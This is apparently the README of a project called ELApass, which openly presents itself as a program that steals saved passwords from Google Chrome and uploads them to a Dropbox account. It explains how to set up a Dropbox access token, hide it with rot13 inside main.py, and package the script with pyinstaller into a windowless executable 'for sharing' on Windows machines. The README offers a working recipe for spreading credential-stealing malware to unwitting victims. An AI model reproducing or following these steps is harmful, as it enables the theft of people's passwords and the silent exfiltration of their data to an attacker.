# ELApass
potentially malicious program that steals passwords from all versions of chrome (including version > 80).
then uploads them in a txt file to an encrypted dropbox

### Requirements
of course you need python 3.* and a dropbox account
```
extra modules required:
[*] pycryptdome
[*] dropbox
[*] win32crypt
[*] pyinstaller
```
just install using `python -m pip install <module>`

### Getting Started
for the files sent over you will need to create a dropbox api app. search `Dropbox App Console` 

after creating go to the oath2 settings and generate an access token.

now go to a (rot13 encoder)[rot13.com] and encode the access token. now you can simply paste the output into *main.py* where specified


### Make EXE
first run the file and check for errors
```
python main.py
```
if not, create an exe for sharing
```
pyinstaller -y -w -F --clean --dist-dir=. main.py
```
if it fails to run as an exe remove the `-w` and see what error outputs in the console (probably a pyinstaller thing). if everything doesn't fuck up like normal... YOUR GOLDEN. now you should have a nice compact executable file that can be run on all windows devices

## Enjoy!
